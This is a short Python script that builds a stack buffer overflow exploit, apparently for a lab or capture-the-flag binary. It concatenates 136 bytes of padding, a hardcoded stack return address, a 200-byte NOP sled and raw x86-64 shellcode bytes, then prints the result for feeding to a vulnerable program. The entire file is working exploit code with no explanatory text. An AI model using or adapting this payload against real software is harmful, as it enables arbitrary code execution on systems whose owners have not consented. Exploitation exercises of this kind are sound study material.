import struct

payload_address = struct.pack("L", 0x00007fffffffe5b0 - 10)

payload = chr(0xcc) + chr(0x48) + chr(0x83) + chr(0xec) + chr(0x08) + chr(0x31) + chr(0xd2) + chr(0x48) + chr(0x8d) + chr(0x3d) + chr(0xb7) + chr(0x0f) + chr(0x00) + chr(0x00) + chr(0x31) + chr(0xf6) + chr(0xe8) + chr(0xdc) + chr(0xff) + chr(0xff) + chr(0xff)

base_pointer_length = 0x8 # bytes
padding_from_payload_to_return_address = 'a'*(128 + base_pointer_length)

print(padding_from_payload_to_return_address + payload_address + "\x90"*200 + payload)
